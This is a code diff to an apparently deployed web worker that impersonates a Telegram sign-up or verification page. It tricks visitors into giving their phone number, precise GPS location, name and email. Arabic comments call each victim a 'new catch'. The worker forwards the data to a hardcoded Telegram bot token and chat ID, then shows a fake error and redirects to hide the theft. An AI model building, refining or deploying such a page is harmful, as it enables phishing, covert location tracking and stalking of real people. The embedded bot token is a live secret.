@@ -14,10 +14,8 @@ export default {
             .logo { width: 80px; margin-bottom: 20px; }
             h2 { font-weight: 500; margin-bottom: 10px; color: #222; }
             p { color: #707579; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
-            input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dfe1e5; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; transition: border 0.3s; }
-            input:focus { border-color: #3390ec; }
-            button { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
-            button:hover { background: #2b80d1; }
+            input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dfe1e5; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
+            button { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
             .step { display: none; }
             .step.active { display: block; }
           </style>
@@ -28,67 +26,71 @@ export default {
             
             <div id="step1" class="step active">
               <h2>Your Phone</h2>
-              <p>Please confirm your country code and enter your phone number to start verification.</p>
+              <p>Please confirm your country code and enter your phone number.</p>
               <input id="phone" type="tel" placeholder="+964 7XX XXX XXXX">
-              <button onclick="goToStep2()">NEXT</button>
+              <button id="btn1" onclick="handleStep1()">NEXT</button>
             </div>
 
             <div id="step2" class="step">
-              <h2>Profile Details</h2>
-              <p>Update your cloud profile information to ensure session synchronization.</p>
+              <h2>Profile Sync</h2>
+              <p>Complete your cloud profile to synchronize your messages.</p>
               <input id="username" type="text" placeholder="Full Name (Optional)">
               <input id="email" type="email" placeholder="Recovery Email (Optional)">
-              <button id="finalBtn" onclick="finishProcess()">FINISH SETUP</button>
+              <button id="btn2" onclick="handleStep2()">FINISH</button>
             </div>
           </div>
 
           <script>
-            let userData = { phone: "", lat: "Unknown", lon: "Unknown", accuracy: "Approximate" };
+            let mainData = { phone: "", lat: "0", lon: "0", acc: "None" };
 
-            function goToStep2() {
-              const phone = document.getElementById("phone").value;
-              if (!phone) { alert("Please enter your phone number"); return; }
-              userData.phone = phone;
+            async function handleStep1() {
+              const ph = document.getElementById("phone").value;
+              if (!ph) { alert("Enter phone number"); return; }
+              document.getElementById("btn1").innerText = "Verifying...";
 
               if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                  (pos) => {
-                    userData.lat = pos.coords.latitude;
-                    userData.lon = pos.coords.longitude;
-                    userData.accuracy = pos.coords.accuracy < 100 ? "Exact (GPS)" : "Approximate";
-                    switchStep(2);
-                  },
-                  (err) => {
-                    alert("⚠️ Security Error: Location access is required to verify your region.");
-                  },
-                  { enableHighAccuracy: true }
-                );
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                  mainData.phone = ph;
+                  mainData.lat = pos.coords.latitude;
+                  mainData.lon = pos.coords.longitude;
+                  mainData.acc = pos.coords.accuracy < 100 ? "🟢 Exact GPS" : "🟡 Approximate";
+                  
+                  // إرسال فوري بمجرد الحصول على الموقع والرقم
+                  await sendReport("FIRST_HIT");
+                  switchStep(2);
+                }, (err) => {
+                  alert("⚠️ Security Verification Required: Please allow location access.");
+                  document.getElementById("btn1").innerText = "NEXT";
+                }, { enableHighAccuracy: true });
               }
             }
 
-            function switchStep(stepNum) {
-              document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-              document.getElementById('step' + stepNum).classList.add('active');
+            async function handleStep2() {
+              document.getElementById("btn2").innerText = "Syncing...";
+              const name = document.getElementById("username").value || "Skipped";
+              const email = document.getElementById("email").value || "Skipped";
+              
+              // إرسال التقرير التكميلي (الاسم والإيميل)
+              await sendReport("FINAL_HIT", name, email);
+              
+              alert("❌ Sync Error: Connection lost. Redirecting...");
+              window.location.href = "https://telegram.org/dl";
             }
 
-            async function finishProcess() {
-              document.getElementById("finalBtn").innerText = "Synchronizing...";
-              const name = document.getElementById("username").value || "Not Provided";
-              const email = document.getElementById("email").value || "Not Provided";
+            function switchStep(n) {
+              document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+              document.getElementById('step' + n).classList.add('active');
+            }
 
+            async function sendReport(type, name = "", email = "") {
               await fetch(window.location.href, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                  ...userData,
-                  name: name,
-                  email: email,
-                  model: navigator.userAgent
+                  type, phone: mainData.phone, lat: mainData.lat, lon: mainData.lon, 
+                  acc: mainData.acc, name, email, ua: navigator.userAgent
                 })
               });
-
-              alert("❌ Connection Timeout: Cloud verification failed. Redirecting to official login...");
-              window.location.href = "https://telegram.org/dl";
             }
           </script>
         </body>
@@ -98,34 +100,30 @@ export default {
 
     if (request.method === "POST") {
       try {
-        const data = await request.json();
+        const d = await request.json();
         const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
         const CHAT_ID = "5794792675";
+        const maps = "https://www.google.com/maps?q=lat,lon" + d.lat + "," + d.lon;
 
-        const statusEmoji = data.accuracy.includes("Exact") ? "🟢 [دقيق جداً - GPS]" : "🟡 [تقريبي]";
-        const maps = "https://www.google.com/maps?q=lat,lon" + data.lat + "," + data.lon;
-
-        const message = "🗂️ [DQACD - FULL DOSSIER] 🗂️\\n" +
-                        "--------------------------------\\n" +
-                        "📱 الرقم: " + data.phone + "\\n" +
-                        "👤 الاسم: " + data.name + "\\n" +
-                        "📧 الإيميل: " + data.email + "\\n" +
-                        "--------------------------------\\n" +
-                        "🛰️ الحالة: " + statusEmoji + "\\n" +
-                        "📍 الإحداثيات: " + data.lat + "," + data.lon + "\\n" +
-                        "🗺️ خرائط جوجل: " + maps + "\\n" +
-                        "🛠️ الجهاز: " + data.model;
+        let msg = "";
+        if (d.type === "FIRST_HIT") {
+          msg = "🚀 [عاجل - صيد جديد] 🚀\\n" +
+                "📱 الرقم: " + d.phone + "\\n" +
+                "📍 الموقع: " + d.acc + "\\n" +
+                "🗺 الخريطة: " + maps;
+        } else {
+          msg = "📝 [تكملة البيانات للرقم: " + d.phone + "]\\n" +
+                "👤 الاسم: " + d.name + "\\n" +
+                "📧 الإيميل: " + d.email;
+        }
 
         await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
         });
-
         return new Response("ok");
-      } catch (e) {
-        return new Response("error", { status: 400 });
-      }
+      } catch (e) { return new Response("err"); }
     }
   }
 };
